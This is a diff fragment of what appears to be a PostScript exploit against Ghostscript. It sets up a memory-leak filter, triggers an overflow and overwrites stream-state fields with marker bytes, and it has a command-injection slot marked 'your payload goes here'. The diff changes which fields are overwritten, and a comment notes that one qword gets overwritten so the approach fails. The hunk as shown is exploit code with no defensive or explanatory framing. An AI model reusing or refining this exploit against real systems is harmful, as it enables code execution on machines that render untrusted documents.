@@ -71,11 +71,7 @@
  /leakMemoryFilter leakBuffer /NullEncode filter /BCPEncode filter def
  createOverflow
  <CMD_INJECT> concatstrings % s->template (your payload goes here)
- <4444444444444444> concatstrings % s->memory
- <4545454545454545> concatstrings % s->report_error
- <4646464646464646> concatstrings % s->min_left
- 1 1 80{pop <47> concatstrings }  for% s->error_string
- <4848484848484848> concatstrings % s->cursor->r->ptr
+ <4848484848484848> concatstrings % s->cursor->r->ptr; this qword will be overwritten by Ghostscript, so we can't exploit
  leakMemoryFilter exch writestring
  leakMemoryFilter flushfile
  revision 9560 ge 
